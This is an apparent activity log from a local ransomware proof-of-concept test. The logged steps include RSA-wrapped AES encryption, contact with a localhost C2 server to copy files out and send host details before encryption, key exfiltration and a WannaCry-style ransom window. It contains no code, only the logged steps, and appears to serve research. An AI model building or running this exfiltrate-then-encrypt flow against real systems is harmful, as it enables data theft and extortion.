2025-06-25 12:02:03,573 - INFO - ============================================================
2025-06-25 12:02:03,574 - INFO - RANSOMWARE PoC ACTIVITY LOG STARTED
2025-06-25 12:02:03,574 - INFO - ============================================================
2025-06-25 12:02:03,575 - INFO - Log file: logs/ransomware_activity_20250625_120203.log
2025-06-25 12:02:03,575 - INFO - Timestamp: 2025-06-25 12:02:03
2025-06-25 12:02:03,922 - INFO - Platform: Windows 11
2025-06-25 12:02:03,922 - INFO - Python version: 3.13.5 (tags/v3.13.5:6cb20a2, Jun 11 2025, 16:15:46) [MSC v.1943 64 bit (AMD64)]
2025-06-25 12:02:03,923 - INFO - User: mudit
2025-06-25 12:02:03,923 - INFO - Hostname: Mudityadev
2025-06-25 12:02:03,923 - INFO - ============================================================
2025-06-25 12:02:03,924 - INFO - Starting main function
2025-06-25 12:02:03,924 - INFO - Parsing command line arguments
2025-06-25 12:02:03,924 - INFO - Setting up argument parser
2025-06-25 12:02:03,926 - INFO - Parsing command line arguments
2025-06-25 12:02:03,927 - INFO - Arguments parsed - Path: D:\AI-Agent\Ransomware-PoC\testDir, Encrypt: True, Decrypt: False
2025-06-25 12:02:03,927 - INFO - Operation mode: ENCRYPT
2025-06-25 12:02:03,927 - INFO - Target path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:03,928 - INFO - Using specified path: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:03,928 - INFO - Initializing RSA encryption for AES key
2025-06-25 12:02:03,996 - INFO - AES key encrypted with RSA public key
2025-06-25 12:02:03,996 - INFO - Encrypted key (base64): U6ZuGQxRwdjHfALMqj071pDAwka1fZnwYviGsijazpuOGyHzjxIQNcNv0AGSMEBOC1SRv2556zBtHJWi0jS8RvbK+02doxviXmxoEj1fSZ9iIkOuejrRLoUOaOX1MflPx3/WdRls9HlkhkRATJT7uQLGGLYddAdclycO8th+8J2riAdp3xOrG1l5H+v0qBot48g2ev4abzhJoodTIwHMQBhBTuX73gBXNMGKNCbfCVqRPQME9SZlF6QXV1RTqSbEWdAfMtX0Hd9VsrJNVtxiMEsVJgLlNOhjzpskxqrxTvSlZdRMavBlGwFosvoQu/ucd7Oxh0oitM5oTHFNLOvtyw==
2025-06-25 12:02:03,997 - INFO - Using hardcoded AES key for encryption
2025-06-25 12:02:03,997 - INFO - Creating AES cipher with CTR mode
2025-06-25 12:02:04,007 - INFO - Starting file discovery and processing
2025-06-25 12:02:04,007 - INFO - Connecting to C2 server BEFORE encryption to copy clean files
2025-06-25 12:02:04,007 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:02:04,024 - INFO - Retrieving local IP address
2025-06-25 12:02:04,026 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:02:04,028 - INFO - Successfully sent target directory to C2 server: 127.0.0.1:8080
2025-06-25 12:02:04,029 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:04,029 - INFO - C2 server will now copy clean files before encryption begins
2025-06-25 12:02:04,029 - INFO - Waiting for C2 server to complete file exfiltration...
2025-06-25 12:02:06,030 - INFO - Proceeding with file encryption...
2025-06-25 12:02:06,030 - INFO - Processing directory: D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:06,032 - INFO - Discovered 0 files in D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:06,032 - INFO - Total files processed: 0
2025-06-25 12:02:06,032 - INFO - Starting key exfiltration and GUI launch
2025-06-25 12:02:06,033 - INFO - Attempting to connect to C2 server: 127.0.0.1:8080
2025-06-25 12:02:06,045 - INFO - Retrieving local IP address
2025-06-25 12:02:06,046 - INFO - Local IP address: 192.168.217.136
2025-06-25 12:02:06,047 - INFO - Successfully sent data to C2 server: 127.0.0.1:8080
2025-06-25 12:02:06,047 - INFO - Sent data includes: IP=192.168.217.136, User=mudit, Hostname=Mudityadev, TargetDir=D:\AI-Agent\Ransomware-PoC\testDir
2025-06-25 12:02:06,047 - INFO - Launching WannaCry-style GUI window
2025-06-25 12:02:31,752 - INFO - Received keyboard interrupt, exiting
